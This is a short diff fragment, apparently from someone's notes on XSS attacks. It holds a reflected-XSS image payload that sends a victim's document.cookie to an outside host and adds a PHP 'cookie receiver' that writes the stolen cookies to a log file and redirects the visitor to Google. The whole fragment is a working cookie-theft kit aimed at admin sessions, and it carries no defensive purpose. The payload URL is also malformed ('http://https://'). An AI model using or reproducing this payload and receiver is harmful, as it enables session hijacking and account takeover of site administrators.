@@ -23,3 +23,14 @@ without any space
 steal admins cookie via reflect xss
 
 ><img src=x onerror=document.location='http://https://callmerat.000webhostapp.com/c.php?c='+document.cookie;'>
+  
+php file reciver
+>
+<?php
+
+
+header('location:https://google.com');
+$cookies=$_GET["c"];
+$file=fopen('log.txt', 'a');
+fwrite($file, $cookies . "\n\n");
+?>
